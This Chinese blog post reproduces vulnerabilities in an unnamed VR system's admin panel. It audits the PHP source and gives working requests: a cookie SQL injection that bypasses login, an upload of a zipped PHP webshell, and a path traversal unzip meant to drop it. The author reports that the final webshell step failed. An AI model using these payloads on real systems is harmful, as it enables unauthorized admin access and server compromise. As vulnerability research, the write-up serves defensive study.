---
title: 某VR系统登陆绕过&文件上传
categories:
  - 漏洞复现
copyright: true
index_img: https://s1.ax1x.com/2022/09/16/vzGTWF.jpg
banner_img: https://s1.ax1x.com/2022/09/16/vzGTWF.jpg
abbrlink: 54f87091
date: 2022-09-15 20:27:42
tags:
---



### 0x01 前言

在翻看某报告时看到【xxx系统存在登录绕过和任意文件上传漏洞，可getshell】有点引人注目。

报告有些“简洁”，就几句话描述。

> 通过信息收集，找到源码，对源码进行审计，发现存在远程代码执行漏洞和绕过登录漏洞。

完全看不懂，然后就是结果截图了.....那就本地搭个环境看看是咋回事。

### 0x02 信息

首页界面这样子：

![](https://s1.ax1x.com/2022/09/16/vzQpW9.png)

登录界面大概这样：

![](https://s1.ax1x.com/2022/09/16/vzMjdU.png)



### 0x03 后台登陆绕过

#### 分析

导入Seay自动审计，发现其中有一条SQL注入较为醒目：

```php
$sql = "select * from ".$Base->table('admin')." where id=".$_COOKIE['admin']['id']."";
```

这是直接从cookie获取值进行SQL查询了？

![9](https://s1.ax1x.com/2022/09/16/vzMzi4.png)

相应关键代码段：

vradmin/include/init.php

```php
......
$Json = new Json;
$Db = MyPDO::getInstance($db_host,$db_user,$db_pass,$db_name,$db_charset);
$Base = new Base($db_name,$db_prefix);

$admin = array(
 'id' => isset($_SESSION['admin']['id']) ? $_SESSION['admin']['id']: 0,
 'admin_name' => isset($_SESSION['admin']['admin_name']) ? $_SESSION['admin']['admin_name']: '',
);

if($_COOKIE['admin']['id']>0 && $admin['id']==0){ 
   $sql = "select * from ".$Base->table('admin')." where id=".$_COOKIE['admin']['id']."";
   $u = $Db->query($sql,"Row");

   $hashcode = Common::encrypt($u['admin_name'].$u['passwd']);
   if($hashcode==$_COOKIE['admin']['hashcode']){
     unset($u['passwd']);
	 $_SESSION['admin'] = $admin = $u;
   }
}
......
```

两个判断

1、判断cookie中的 `admin[id]` 是否大于0，以及 `$admin[id]` 的结果是否为0，都成立则执行SQL查询；

2、判断cookie中的 `admin[hashcode]` 是否跟$hashcod一致，一致就销毁passwd，然后把从数据库查询到的结果$u赋值给$admin，再赋值到session。



跟进 `Common::encrypt` 方法，发现其实就是 `admin_name` 和 `passwd` 拼接然后进行两次MD5。

![](https://s1.ax1x.com/2022/09/16/vzQSJJ.png)

#### 测试

![](https://s1.ax1x.com/2022/09/16/vzMvoF.png)


抓个登录包，Change body encoding

Cookie传入 `admin[hashcode]=7bfc85c0d74ff05806e0b5a0fa0c1df1; admin[id]=1 union select 2,1,1;`

登录失败，账号密码不正确？

![](https://s1.ax1x.com/2022/09/16/vzQisx.png)

开启MySQL监控

![](https://s1.ax1x.com/2022/09/16/vzQPQ1.png)

![](https://s1.ax1x.com/2022/09/16/vzQ9zR.png)

cookie中的联合查询确实是已经带入数据库进行查询了，为什么还是登录失败呢？

回头重新梳理，才发现，找错接口了。不是 `m=login`，而是 `m=user `接口。

![](https://s1.ax1x.com/2022/09/16/vzQFL6.png)

#### 构建数据包

```sqlite
POST /vradmin/?m=user HTTP/1.1
Host: www.bing.com
Content-Length: 17
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Origin: http://www.bing.com
Referer: http://www.bingcom/vradmin/?m=login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: admin[hashcode]=7bfc85c0d74ff05806e0b5a0fa0c1df1; admin[id]=2 union select 2,1,1;
Connection: close

atc=profile&uid=2
```

成功绕过登录

![](https://s1.ax1x.com/2022/09/16/vzQAeK.png)



### 0x04 后台文件上传

#### 任意文件上传

Seay 报了 `vradmin/upload.php` 存在文件上传功能，上传类型可控？

相应关键代码段

```php
......
$act = Common::sfilter($_REQUEST['act']);
......
if($act=='article'){
	$dir_path = 'data/article/'.date('Ym',Common::gmtime());
	Common::make_dir($dir_path);
	$file_path = $dir_path.'/'.Common::gmtime().'.png';
	$data['error'] = 1;
	if(move_uploaded_file($_FILES['imgFile']['tmp_name'],$file_path)){
		$data = array('error'=>0,'url'=>'/'.$file_path); //返回路径
	}
	else{
		$data['message'] = '上传失败！';
	}
}
......
```

如果 `act=article` 时，就继续处理请求，act作为POST和GET传参皆可。

路径为 `data/article/时间年月`，然后用当前时间戳作为文件名，上传文件类型有做限制，以 `data/article/时间年月/时间戳.png` 的格式保存，还蛮贴心的，成功上传就返回路径。

![](https://s1.ax1x.com/2022/09/16/vzQEdO.png)

虽然，没有对上传类型进行限制，可上传任意文件。

![](https://s1.ax1x.com/2022/09/16/vzQmJH.png)

但是保存时已经写死保存为.png了，也就是不能直接利用，需要结合其他漏洞，比如，文件包含？或者是后台系统升级功能有缺陷-可控。

vradmin/include/upgrade.php  升级解压功能

```php
......
$package_dir = ROOT_PATH.'upgrade/package/';//存放压缩文件和解压后代码的文件夹

$act = Common::sfilter($_REQUEST['act']);


//下载升级包
if($act == 'download'){
	$re['status'] = 0;

	$version = (array)simplexml_load_file(ROOT_PATH.'data/version.conf', 'SimpleXMLElement', LIBXML_NOCDATA);
	$url = $version['downurl']."upgrade.php?customid=".$custom['customid']."&code=".$version['code']."&step=1";
	//设置该次请求超时时长，1800s
	@ini_set("max_execution_time", "1800"); 
	//兼容php-fpm设置超时
	@ini_set("request_terminate_timeout", "1800");
	
	$file = file_get_contents($url);
	if (!$file) {
		$re['msg'] = '升级包下载失败';
	}else{
		if (file_exists($package_dir)) {
			//删除package目录
			require_once ROOT_PATH.'source/include/cls_file_util.php';
			FileUtil::unlinkDir($package_dir);
		}
		Common::make_dir($package_dir);
		$zip_file = Common::gmtime().'.zip';
		file_put_contents($package_dir.$zip_file, $file);
		 @chmod($package_dir.$zip_file, 0777);
		$re['status'] = 1;
		$re['zip_file'] = $zip_file;
	}
	echo $Json->encode($re);
	exit;
}
//解压缩
else if($act == 'unzip'){
	$re['status'] = 0 ;
	$zip_file = Common::sfilter($_REQUEST['zip_file']);
	$zip_file_ab = $package_dir.$zip_file;
	if (!file_exists($zip_file_ab)) {
		$re['msg'] = '升级包不存在';
	}else{
		require_once ROOT_PATH.'source/include/pclzip.lib.php';
		$archive = new PclZip($zip_file_ab);
		if ($archive->extract(PCLZIP_OPT_PATH, $package_dir)){
		    $re['status'] = 1;
		}else {
		    $re['msg'] = '升级包解压失败' ;
		    unlink($zip_file_ab);
}
}
echo $Json->encode($re);
exit;
}
......

```

解压功能，如果act传参为unzip时，就进入解压处理；

通过参数`zip_file` 传给Common::sfilter获取升级包文件，然后把完整路径赋值给 `$zip_file_ab`，如果存在指定的升级包，则使用PclZIp(一个开源的压缩于解压的类库包)进行解压缩，存放到 `upgrade/package` 下。



跟进sfilter方法，发现作了相应的过滤，如url解码、去除html标签、字符串html实体化、加反斜杠转义等。

也就是参数zip_file可控并且没有对 `../../` `..\..\` 做处理。

![](https://s1.ax1x.com/2022/09/16/vzQVoD.png)

#### 构造数据包

把php webshell打zip压缩，向 `/vradmin/upload.php?act=article ` 接口上传

```html
<!DOCTYPE html>
<html>
<head>
    <style>
        html {
            font-family: sans-serif;
        }
    </style>
</head>
<body>
    
    <h2>File Uploader</h2>
    <input type="file" name="imgFile" id="file_to_upload">
    <hr>
    <p id="file_name"></p>
    <progress id="progress_bar" value="0" max="100" style="width:400px;"></progress>
    <p id="progress_status"></p>
    <input type="button" value="Upload To Server" id="upload_file_button">

    <script>

        document.getElementById('file_to_upload').addEventListener('change', (event) => {
            window.selectedFile = event.target.files[0];
            document.getElementById('file_name').innerHTML = window.selectedFile.name;
        });

        document.getElementById('upload_file_button').addEventListener('click', () => {
            uploadFile(window.selectedFile);
        });

        function uploadFile(file) {
            var formData = new FormData();
            formData.append('imgFile', file);

            var ajax = new XMLHttpRequest();
            ajax.upload.addEventListener('progress', progressHandler, false);
            ajax.open('POST', '/vradmin/upload.php?act=article');
            ajax.send(formData);
        }

        function progressHandler() {
            var percent = (event.loaded / event.total) * 100;
            document.getElementById('progress_bar').value = Math.round(percent);
            document.getElementById('progress_status').innerHTML = Math.round(percent) + '% uploaded';
        }

    </script>

</body>
</html>
```

抓包加上cookie以及修改目标地址

![](https://s1.ax1x.com/2022/09/16/vzQeFe.png)

解压

`/vradmin/index.php?m=upgrade `

```sqlite
POST /vradmin/index.php?m=upgrade HTTP/1.1
Host: www.bing.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml; q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=rencbs7p8t9bbpicsn386nq1n6
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

act=unzip&zip_file=../../data/article/202207/1658248821.png
```



#### 坑...

解压会把png文件删除并且无法得到webshel，至于为什么暂时不清楚，以后再择机填坑吧。



